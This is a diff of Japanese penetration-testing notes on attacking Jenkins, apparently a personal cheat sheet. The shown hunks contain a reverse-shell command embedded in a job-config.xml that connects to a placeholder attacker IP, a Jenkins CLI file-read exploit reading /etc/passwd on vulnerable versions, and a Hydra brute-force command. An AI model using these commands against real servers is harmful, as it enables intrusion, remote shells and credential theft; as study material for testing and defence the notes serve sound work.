@@ -196,9 +196,11 @@ proc.waitForOrKill(1000)
 println "out> $sout"
 ````
 
-リバースシェル([revshell.com](https://www.revshells.com/))
-	⚠️ShellはターゲットOSに合わせて、Linuxならbash、Windowsならcmdとすること
+リバースシェル（🔗[revshell.com](https://www.revshells.com/)）
+	ShellはターゲットOSに合わせて、Linuxならbash、Windowsならcmdとすること
+
 ![](../画像ファイル/Pasted%20image%2020260113123622.png)
+
 $$revshells.com$$
 
 ## ジョブ作成によるエクスプロイト
@@ -215,7 +217,7 @@ curl -X POST \
 2. `job-config.xml`にリバースシェル等を埋め込む
 ```
 <hudson.tasks.Shell>
-  <command>zsh -i >& /dev/tcp/<AttackerIP>/4444 0>&1</command>
+  <command>zsh -i >& /dev/tcp/<attacker_IP>/4444 0>&1</command>
 </hudson.tasks.Shell>
 ```
 
@@ -240,7 +242,7 @@ curl -X POST \  <url>/user/<username>/descriptorByName/jenkins.security.api_toke
 
 ※ 脆弱なバージョン:
 - Jenkins < 2.441
-- LTS < 2.426.3 ([ScanNetSecurity](https://scan.netsecurity.ne.jp/article/2024/03/27/50773.html))
+- LTS < 2.426.3 (🔗[Jenkins に任意のファイルの読み取りが可能となるコマンドラインインターフェース機能におけるアクセス制御不備の脆弱性（Scan Tech Report） - ScanNetSecurity](https://scan.netsecurity.ne.jp/article/2024/03/27/50773.html))
 ```zsh
 # windowsの場合：@C:\Windows\win.ini
 java -jar jenkins-cli.jar -s <url>/ help "@/etc/passwd"
@@ -248,7 +250,7 @@ java -jar jenkins-cli.jar -s <url>/ help "@/etc/passwd"
 
 ## ブルートフォース
 
-Hydra例:
+Hydra例
 ```zsh
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
   TARGET http-post-form \
